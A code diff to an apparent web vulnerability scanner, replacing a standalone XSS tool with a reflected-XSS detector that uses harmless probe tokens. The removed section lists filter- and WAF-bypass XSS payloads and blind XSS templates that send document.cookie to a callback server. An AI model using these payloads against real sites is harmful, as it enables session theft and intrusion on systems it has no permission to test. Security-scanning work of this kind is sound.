@@ -1,378 +1,491 @@
-# -*- coding: utf-8 -*-
-"""
-XSS Scanner — Merged & Enhanced
-Combines: xss.py (reflected) + blind_xss.py (OOB) + xssfinder (DOM scraping, param discovery)
-"""
+import html as html_lib
+from urllib.parse import urljoin, urlsplit, urlunsplit, parse_qsl, urlencode
 
-import sys
-import re
-import argparse
-import requests
-import urllib3
-from urllib import parse
-from urllib.parse import urlencode
+from bs4 import BeautifulSoup
 
-try:
-    from bs4 import BeautifulSoup
-    BS4 = True
-except ImportError:
-    BS4 = False
-
-try:
-    from colorama import init, Fore
-    init(autoreset=True)
-    COLOR = True
-except ImportError:
-    COLOR = False
-    class Fore:
-        GREEN = RED = YELLOW = CYAN = BLUE = MAGENTA = RESET = ""
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ─────────────────────────────────────────
-# 🧠  META  (framework compat)
-# ─────────────────────────────────────────
+from services.scan_runtime import RequestBudgetExceeded, ScanCancelled
+from vulnerabilities.common import (
+    body_text,
+    error_result,
+    make_result,
+    safe_request,
+    unique_token,
+)
 
 meta = {
-    "name":        "XSS Scanner (Merged)",
-    "severity":    "High",
-    "description": "Reflected + Blind XSS with DOM-based param discovery",
+    "name": "Reflected XSS",
+    "severity": "High",
+    "description": "Detects reflected XSS in HTML, script, event-handler, and URL contexts.",
+    "category": "Injection",
 }
 
-inputs = ["param"]
-
-# ─────────────────────────────────────────
-# 🎨  OUTPUT HELPERS
-# ─────────────────────────────────────────
-
-def info(msg):    print(Fore.CYAN    + f"[*] {msg}")
-def ok(msg):      print(Fore.GREEN   + f"[+] {msg}")
-def warn(msg):    print(Fore.YELLOW  + f"[!] {msg}")
-def fail(msg):    print(Fore.RED     + f"[-] {msg}")
-def section(msg): print(Fore.MAGENTA + f"\n{'─'*55}\n    {msg}\n{'─'*55}")
-
-# ─────────────────────────────────────────
-# 📋  PAYLOADS
-# ─────────────────────────────────────────
-
-REFLECTED_PAYLOADS = [
-    # Basic
-    "<script>alert(1)</script>",
-    "'\"><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg/onload=alert(1)>",
-    # Attribute breakout
-    "\" onmouseover=\"alert(1)",
-    "' onmouseover='alert(1)",
-    "javascript:alert(1)",
-    # Filter evasion
-    "<ScRiPt>alert(1)</ScRiPt>",
-    "<img src=x onerror=\"alert`1`\">",
-    "<svg><script>alert(1)</script></svg>",
-    "<body onload=alert(1)>",
-    # Polyglots
-    "';alert(1)//",
-    "\"><img src=x onerror=alert(1)>",
-    "<iframe src=\"javascript:alert(1)\">",
-    # WAF bypass
-    "<svg onload=alert&#40;1&#41;>",
-    "%3Cscript%3Ealert(1)%3C/script%3E",
-    "<details/open/ontoggle=alert(1)>",
-    "<input autofocus onfocus=alert(1)>",
-    "<select autofocus onfocus=alert(1)>",
+inputs = [
+    {
+        "name": "param",
+        "label": "Parameter",
+        "type": "text",
+        "required": False,
+        "placeholder": "search",
+    }
 ]
 
-BLIND_PAYLOADS_TEMPLATE = [
-    '<script src="{server}"></script>',
-    '<img src="{server}" onerror="this.src=\'{server}?c=\'+document.cookie">',
-    '"><script src="{server}"></script>',
-    "'><script src=\"{server}\"></script>",
-    '<svg onload="fetch(\'{server}?c=\'+document.cookie)">',
-]
 
-HEADERS = {
-    "User-Agent": (
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
-        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+INERT_CONTEXTS = ["textarea", "title", "style", "xmp", "noscript", "template"]
+
+
+def set_query_param(url, name, value):
+    parts = urlsplit(url)
+    query = parse_qsl(parts.query, keep_blank_values=True)
+
+    # Replace existing parameter instead of appending duplicate values.
+    query = [(k, v) for k, v in query if k != name]
+    query.append((name, value))
+
+    path = parts.path or "/"
+
+    return urlunsplit(
+        (
+            parts.scheme,
+            parts.netloc,
+            path,
+            urlencode(query, doseq=True),
+            parts.fragment,
+        )
     )
-}
 
-# ─────────────────────────────────────────
-# 🔍  DOM PARAM DISCOVERY  (from xssfinder)
-# ─────────────────────────────────────────
 
-def discover_params(url, verbose=False):
-    """
-    Scrape the page and extract potential parameters from:
-      - input/textarea/select/button name & id attributes
-      - data-* attributes
-      - JavaScript var declarations
-      - Existing GET parameters in the URL
-    Returns a deduplicated list of parameter names.
-    """
-    params = []
-    try:
-        if verbose:
-            info(f"Scraping {url} for parameters...")
-        r = requests.get(url, headers=HEADERS, verify=False, timeout=15,
-                         allow_redirects=False)
-        content = r.text
+def get_query_param_names(url):
+    parts = urlsplit(url)
+    return list(dict(parse_qsl(parts.query, keep_blank_values=True)).keys())
 
-        # Existing URL params
-        parsed = parse.urlparse(url)
-        url_params = list(parse.parse_qs(parsed.query).keys())
-        params += url_params
 
-        # data-* attributes
-        data_attrs = re.findall(r' data-([a-zA-Z0-9\-_]+)', content)
-        params += data_attrs
+def attr_to_text(value):
+    if isinstance(value, list):
+        return " ".join(str(v) for v in value)
+    return str(value)
 
-        # name/id attributes on form elements
-        elements = re.findall(r' (?:name|id)=["\']?([a-zA-Z0-9\-_]+)["\']?', content)
-        params += elements
 
-        # JS var declarations
-        js_vars = re.findall(r'var\s+([a-zA-Z0-9\-_]+)\s*=', content)
-        params += js_vars
+def has_inert_parent(tag):
+    return tag.find_parent(INERT_CONTEXTS) is not None
 
-        # BeautifulSoup deep scan (if available)
-        if BS4:
-            soup = BeautifulSoup(content, "html.parser")
-            for tag in soup.find_all(["input", "textarea", "select", "button"]):
-                for attr in ("name", "id"):
-                    v = tag.get(attr)
-                    if v:
-                        params.append(v)
 
-        unique = list(dict.fromkeys(p for p in params if p))
-        if verbose:
-            ok(f"Discovered {len(unique)} parameter(s): {', '.join(unique)}")
-        return unique
+def looks_like_html(content_type, body):
+    content_type = (content_type or "").lower()
+    sample = (body or "")[:700].lower()
 
-    except Exception as e:
-        warn(f"Param discovery error: {e}")
-        return []
+    return (
+        "html" in content_type
+        or "<html" in sample
+        or "<!doctype html" in sample
+        or "<body" in sample
+        or "<script" in sample
+        or "<form" in sample
+    )
 
-# ─────────────────────────────────────────
-# 🔥  REFLECTED XSS SCAN
-# ─────────────────────────────────────────
 
-def scan_reflected(url, params, verbose=False):
-    """
-    Test each param with every reflected XSS payload.
-    Returns list of findings dicts.
-    """
-    findings = []
-    try:
-        baseline = requests.get(url, headers=HEADERS, verify=False,
-                                timeout=15, allow_redirects=False)
-        baseline_len = len(baseline.content)
-    except Exception as e:
-        warn(f"Baseline fetch failed: {e}")
-        return findings
+def build_payloads(token):
+    js = f"window.__cyberscan_probe='{token}'"
 
-    for param in params:
-        for payload in REFLECTED_PAYLOADS:
-            try:
-                # Build URL keeping other params intact
-                parsed = parse.urlparse(url)
-                qs = dict(parse.parse_qsl(parsed.query))
-                qs[param] = payload
-                test_url = parse.urlunparse(
-                    parsed._replace(query=parse.urlencode(qs))
-                )
+    return [
+        {
+            "name": "script_tag",
+            "payload": f"<script>{js}</script>",
+            "context": "HTML script tag injection",
+        },
+        {
+            "name": "img_onerror",
+            "payload": f'"><img src=x onerror="{js}">',
+            "context": "Attribute breakout into img onerror",
+        },
+        {
+            "name": "svg_onload",
+            "payload": f'"><svg onload="{js}"></svg>',
+            "context": "Attribute breakout into svg onload",
+        },
+        {
+            "name": "textarea_breakout",
+            "payload": f"</textarea><script>{js}</script>",
+            "context": "Textarea breakout",
+        },
+        {
+            "name": "title_breakout",
+            "payload": f"</title><script>{js}</script>",
+            "context": "Title breakout",
+        },
+        {
+            "name": "js_single_quote_breakout",
+            "payload": f"';{js}//",
+            "context": "JavaScript single quote string breakout",
+        },
+        {
+            "name": "js_double_quote_breakout",
+            "payload": f'";{js}//',
+            "context": "JavaScript double quote string breakout",
+        },
+        {
+            "name": "javascript_href",
+            "payload": f"javascript:{js}",
+            "context": "javascript: URL injection",
+        },
+    ]
 
-                r = requests.get(test_url, headers=HEADERS, verify=False,
-                                 timeout=10, allow_redirects=False)
 
-                # WAF hints
-                if r.status_code in (403, 406, 429):
-                    warn(f"WAF? HTTP {r.status_code} on param='{param}' payload='{payload[:30]}...'")
-                    continue
+def detect_executable_context(body, content_type, token):
+    body = body or ""
+    decoded_body = html_lib.unescape(body)
 
-                # Detection: payload reflected verbatim in body
-                if payload.lower() in r.text.lower():
-                    ok(f"Reflected XSS | param='{param}' | payload='{payload}'")
-                    findings.append({
-                        "type":    "reflected",
-                        "param":   param,
-                        "payload": payload,
-                        "url":     test_url,
-                        "status":  r.status_code,
-                    })
-                    break  # one hit per param is enough
-                elif verbose:
-                    fail(f"No reflection | param='{param}' | payload='{payload[:40]}'")
+    js_marker = "window.__cyberscan_probe"
 
-            except Exception as e:
-                if verbose:
-                    warn(f"Request error | param='{param}': {e}")
-
-    return findings
-
-# ─────────────────────────────────────────
-# 👻  BLIND XSS SCAN
-# ─────────────────────────────────────────
-
-def scan_blind(url, params, callback_server, verbose=False):
-    """
-    Inject blind XSS payloads pointing to callback_server into every param.
-    Since blind XSS fires asynchronously (in an admin panel etc.), we can only
-    confirm the payload was *sent*, not that it executed.
-    Returns list of sent-payload records.
-    """
-    sent = []
-    for param in params:
-        for template in BLIND_PAYLOADS_TEMPLATE:
-            payload = template.format(server=callback_server)
-            try:
-                qs = {param: payload}
-                test_url = f"{url}?{urlencode(qs)}"
-                r = requests.get(test_url, headers=HEADERS, verify=False,
-                                 timeout=10, allow_redirects=False)
-                ok(f"Blind payload sent | param='{param}' | status={r.status_code}")
-                sent.append({
-                    "type":    "blind",
-                    "param":   param,
-                    "payload": payload,
-                    "url":     test_url,
-                    "status":  r.status_code,
-                })
-                if verbose:
-                    info(f"  payload: {payload[:60]}")
-            except Exception as e:
-                warn(f"Blind send error | param='{param}': {e}")
-    return sent
-
-# ─────────────────────────────────────────
-# 🎯  UNIFIED scan()  — framework-compatible
-# ─────────────────────────────────────────
-
-def scan(url, param="input", blind_server=None, verbose=False):
-    """
-    Full XSS scan: reflected + (optionally) blind.
-    param: comma-separated list, or single param name.
-           If 'auto', params are discovered from the DOM.
-    blind_server: URL of your OOB callback server (e.g. http://yourserver.com/xss.js)
-    Returns: dict { vulnerable, result, severity, details }
-    """
-    # ── Resolve param list ────────────────
-    if param == "auto":
-        params = discover_params(url, verbose=verbose)
-        if not params:
-            warn("No params discovered, trying 'q', 'id', 'search' as fallback.")
-            params = ["q", "id", "search", "name", "input"]
-    else:
-        params = [p.strip() for p in param.split(",") if p.strip()]
-
-    all_findings = []
-
-    # ── Reflected ─────────────────────────
-    section("Reflected XSS scan")
-    reflected = scan_reflected(url, params, verbose=verbose)
-    all_findings += reflected
-
-    # ── Blind ─────────────────────────────
-    if blind_server:
-        section("Blind XSS scan")
-        blind = scan_blind(url, params, blind_server, verbose=verbose)
-        all_findings += blind
-
-    # ── Result ────────────────────────────
-    section("Scan complete")
-    reflected_hits = [f for f in all_findings if f["type"] == "reflected"]
-    blind_hits     = [f for f in all_findings if f["type"] == "blind"]
-
-    parts = []
-    if reflected_hits:
-        parts.append(f"Reflected XSS confirmed on {len(reflected_hits)} param(s)")
-    if blind_hits:
-        parts.append(f"Blind XSS payloads sent to {len(blind_hits)} endpoint(s) — "
-                     "watch your callback server")
-
-    if parts:
-        ok(" | ".join(parts))
-        return {
-            "vulnerable": True,
-            "result":     " | ".join(parts),
-            "severity":   "High",
-            "details":    all_findings,
-        }
-
-    fail("No XSS detected")
-    return {
-        "vulnerable": False,
-        "result":     "No XSS detected",
-        "severity":   "Low",
-        "details":    [],
+    detection = {
+        "token_reflected_raw": token in body,
+        "token_reflected_decoded": token in decoded_body,
+        "js_marker_reflected_raw": js_marker in body,
+        "js_marker_reflected_decoded": js_marker in decoded_body,
+        "executable_context": None,
+        "tag": None,
+        "attribute": None,
+        "inert_html_context": False,
     }
 
-# ─────────────────────────────────────────
-# 🖥️  CLI ENTRY-POINT
-# ─────────────────────────────────────────
+    if not looks_like_html(content_type, body):
+        return False, detection
 
-def main():
-    print(Fore.GREEN + r"""
-  __  _______ _____    _____
-  \ \/ / ____/ ____|  / ____|
-   \  /| (___| (___  | (___   ___ __ _ _ __  _ __   ___ _ __
-   /  \ \___ \\___ \  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
-  / /\ \____) |___) | ____) | (_| (_| | | | | | | |  __/ |
- /_/  \_\____/_____/ |_____/ \___\__,_|_| |_|_| |_|\___|_|
+    soup = BeautifulSoup(body, "html.parser")
 
-     Merged v2.0 — Reflected + Blind + DOM param discovery
-""")
+    # 1) <script>window.__cyberscan_probe='TOKEN'</script>
+    for script in soup.find_all("script"):
+        script_text = script.get_text("", strip=False)
 
-    parser = argparse.ArgumentParser(
-        description="XSS Scanner — Reflected + Blind + DOM param discovery"
+        if js_marker in script_text and token in script_text:
+            inert = has_inert_parent(script)
+
+            detection.update(
+                {
+                    "executable_context": "script_element",
+                    "tag": "script",
+                    "attribute": None,
+                    "inert_html_context": inert,
+                }
+            )
+
+            if not inert:
+                return True, detection
+
+    # 2) Event handlers: onerror, onload, onfocus, ...
+    for tag in soup.find_all(True):
+        if has_inert_parent(tag):
+            continue
+
+        for attr_name, attr_value in tag.attrs.items():
+            attr_name_lower = attr_name.lower()
+            attr_value_text = attr_to_text(attr_value)
+
+            if (
+                attr_name_lower.startswith("on")
+                and js_marker in attr_value_text
+                and token in attr_value_text
+            ):
+                detection.update(
+                    {
+                        "executable_context": "event_handler_attribute",
+                        "tag": tag.name,
+                        "attribute": attr_name,
+                        "inert_html_context": False,
+                    }
+                )
+                return True, detection
+
+    # 3) javascript: URL
+    url_attrs = {"href", "src", "xlink:href", "formaction"}
+
+    for tag in soup.find_all(True):
+        if has_inert_parent(tag):
+            continue
+
+        for attr_name, attr_value in tag.attrs.items():
+            attr_name_lower = attr_name.lower()
+            attr_value_text = attr_to_text(attr_value).strip()
+            decoded_attr = html_lib.unescape(attr_value_text).lower()
+
+            if (
+                attr_name_lower in url_attrs
+                and decoded_attr.startswith("javascript:")
+                and js_marker in attr_value_text
+                and token in attr_value_text
+            ):
+                detection.update(
+                    {
+                        "executable_context": "javascript_url",
+                        "tag": tag.name,
+                        "attribute": attr_name,
+                        "inert_html_context": False,
+                    }
+                )
+                return True, detection
+
+    return False, detection
+
+
+def discover_get_form_targets(url):
+    """
+    Finds GET forms such as:
+    <form method="GET">
+        <input name="search">
+    </form>
+
+    This is important for PortSwigger labs because the vulnerable parameter
+    is usually discovered from the search form.
+    """
+    response = safe_request("GET", url)
+    content_type = response.headers.get("Content-Type", "")
+    body = body_text(response)
+
+    targets = []
+
+    if not looks_like_html(content_type, body):
+        return targets, response
+
+    soup = BeautifulSoup(body, "html.parser")
+
+    for form in soup.find_all("form"):
+        method = (form.get("method") or "get").lower()
+
+        if method != "get":
+            continue
+
+        action = form.get("action") or response.url
+        action_url = urljoin(response.url, action)
+
+        fields = []
+
+        for control in form.find_all(["input", "textarea", "select"]):
+            name = control.get("name")
+
+            if not name:
+                continue
+
+            input_type = (control.get("type") or "text").lower()
+
+            if input_type in {"submit", "button", "reset", "file", "image"}:
+                continue
+
+            value = control.get("value", "")
+            action_url = set_query_param(action_url, name, value)
+
+            if input_type in {"text", "search", "url", "email"} or control.name in {
+                "textarea",
+                "select",
+            }:
+                fields.append(name)
+
+        for field in fields:
+            targets.append(
+                {
+                    "url": action_url,
+                    "param": field,
+                    "source": "discovered_get_form",
+                }
+            )
+
+    return targets, response
+
+
+def add_unique_target(targets, seen, target_url, param, source):
+    if not param:
+        return
+
+    key = (target_url, param)
+
+    if key in seen:
+        return
+
+    seen.add(key)
+    targets.append(
+        {
+            "url": target_url,
+            "param": param,
+            "source": source,
+        }
     )
-    parser.add_argument("-u", "--url",    required=True,
-                        help="Target URL (e.g. http://site.com/page.php?id=1)")
-    parser.add_argument("-p", "--param",  default="auto",
-                        help="Param name(s) comma-separated, or 'auto' for DOM discovery (default: auto)")
-    parser.add_argument("-b", "--blind",  default=None,
-                        help="Blind XSS callback server URL (e.g. http://yourserver.com/xss.js)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
-    parser.add_argument("-f", "--file",   default=None,
-                        help="File with list of URLs (one per line)")
-
-    args = parser.parse_args()
-
-    def run_one(url):
-        if not url.startswith(("http://", "https://")):
-            fail(f"Invalid URL (must start with http/https): {url}")
-            return
-        result = scan(url, param=args.param,
-                      blind_server=args.blind, verbose=args.verbose)
-        print()
-        if result["vulnerable"]:
-            ok(f"[!!!] VULNERABLE — {result['result']}")
-            for d in result["details"]:
-                if d["type"] == "reflected":
-                    info(f"  param={d['param']}  payload={d['payload']}")
-        else:
-            fail(f"[+]  NOT vulnerable — {result['result']}")
-
-    if args.file:
-        try:
-            with open(args.file) as f:
-                urls = [u.strip() for u in f if u.strip()]
-            info(f"Loaded {len(urls)} URL(s) from {args.file}")
-            for url in urls:
-                run_one(url)
-        except FileNotFoundError:
-            fail(f"File not found: {args.file}")
-    else:
-        run_one(args.url)
 
 
-if __name__ == "__main__":
+def scan(url, param=""):
+    token = unique_token("xss")
+    payloads = build_payloads(token)
+
+    requests_made = 0
+    attempts = []
+    targets = []
+    seen_targets = set()
+    last_endpoint = url
+
     try:
-        main()
-    except KeyboardInterrupt:
-        warn("\nInterrupted by user.")
-    except Exception as e:
-        print(Fore.RED + f"[!] Unexpected error: {e}")
-    finally:
-        input(Fore.CYAN + "\nPress Enter to exit.")
+        # 1) Manual param from UI, example: search
+        if param:
+            add_unique_target(targets, seen_targets, url, param, "manual_input")
+
+        # 2) Existing query params from URL, example: /?search=h
+        for query_param in get_query_param_names(url):
+            add_unique_target(targets, seen_targets, url, query_param, "url_query")
+
+        # 3) Discover GET forms if no param was provided/found
+        if not targets:
+            discovered_targets, discovery_response = discover_get_form_targets(url)
+            requests_made += 1
+
+            for item in discovered_targets:
+                add_unique_target(
+                    targets,
+                    seen_targets,
+                    item["url"],
+                    item["param"],
+                    item["source"],
+                )
+
+        # 4) Smart fallback for common search parameters
+        if not targets:
+            for common_param in ["search", "q", "query", "s", "keyword"]:
+                add_unique_target(
+                    targets,
+                    seen_targets,
+                    url,
+                    common_param,
+                    "common_param_fallback",
+                )
+
+        if not targets:
+            return make_result(
+                False,
+                "No GET parameter or search form was found to test.",
+                status="inconclusive",
+                severity="Info",
+                confidence="Low",
+                evidence={
+                    "target": url,
+                    "hint": "Try scanning a URL like /?search=test or enter parameter name: search",
+                },
+                endpoint=url,
+                requests_made=requests_made,
+            )
+
+        for target in targets:
+            target_url = target["url"]
+            target_param = target["param"]
+
+            baseline_url = set_query_param(target_url, target_param, token)
+            baseline = safe_request("GET", baseline_url)
+            requests_made += 1
+
+            baseline_body = body_text(baseline)
+            baseline_content_type = baseline.headers.get("Content-Type", "")
+
+            baseline_confirmed, baseline_detection = detect_executable_context(
+                baseline_body,
+                baseline_content_type,
+                token,
+            )
+
+            for payload_info in payloads:
+                payload_name = payload_info["name"]
+                payload = payload_info["payload"]
+
+                test_url = set_query_param(target_url, target_param, payload)
+                response = safe_request("GET", test_url)
+                requests_made += 1
+                last_endpoint = response.url
+
+                content_type = response.headers.get("Content-Type", "")
+                body = body_text(response)
+                decoded_body = html_lib.unescape(body)
+
+                confirmed, detection = detect_executable_context(
+                    body,
+                    content_type,
+                    token,
+                )
+
+                attempt = {
+                    "target_source": target["source"],
+                    "tested_url": response.url,
+                    "parameter": target_param,
+                    "payload_name": payload_name,
+                    "context_tested": payload_info["context"],
+                    "status_code": response.status_code,
+                    "content_type": content_type,
+                    "token_reflected_raw": token in body,
+                    "token_reflected_decoded": token in decoded_body,
+                    "payload_reflected_raw": payload in body,
+                    "payload_reflected_decoded": payload in decoded_body,
+                    "confirmed_executable_context": confirmed,
+                    "detection": detection,
+                }
+
+                attempts.append(attempt)
+
+                if confirmed and not baseline_confirmed:
+                    evidence = {
+                        "parameter": target_param,
+                        "token": token,
+                        "target_source": target["source"],
+                        "baseline_url": baseline.url,
+                        "confirmed_url": response.url,
+                        "confirmed_payload": payload_name,
+                        "confirmed_context": payload_info["context"],
+                        "baseline_detection": baseline_detection,
+                        "detection": detection,
+                        "attempts": attempts,
+                    }
+
+                    return make_result(
+                        True,
+                        "Reflected XSS confirmed. The probe was reflected into an executable HTML/JavaScript context.",
+                        severity="High",
+                        confidence="High",
+                        evidence=evidence,
+                        recommendation=(
+                            "Apply context-aware output encoding, escape user input before inserting it into HTML, "
+                            "avoid direct insertion into JavaScript contexts, and use a restrictive Content Security Policy."
+                        ),
+                        endpoint=response.url,
+                        parameter=target_param,
+                        cwe="CWE-79",
+                        cvss=8.2,
+                        requests_made=requests_made,
+                    )
+
+        any_reflection = any(
+            item["token_reflected_raw"] or item["token_reflected_decoded"]
+            for item in attempts
+        )
+
+        message = (
+            "Input reflection was detected, but executable XSS was not confirmed."
+            if any_reflection
+            else "Reflected XSS was not confirmed. The tested payloads were not reflected."
+        )
+
+        return make_result(
+            False,
+            message,
+            severity="Info",
+            confidence="Medium",
+            evidence={
+                "tested_targets": targets,
+                "token": token,
+                "attempts": attempts,
+            },
+            endpoint=last_endpoint,
+            parameter=targets[0]["param"] if targets else param,
+            cwe="CWE-79",
+            requests_made=requests_made,
+        )
+
+    except (ScanCancelled, RequestBudgetExceeded):
+        raise
+
+    except Exception as exc:
+        return error_result(
+            f"Reflected-XSS check failed: {exc}",
+            endpoint=url,
+            parameter=param,
+        )
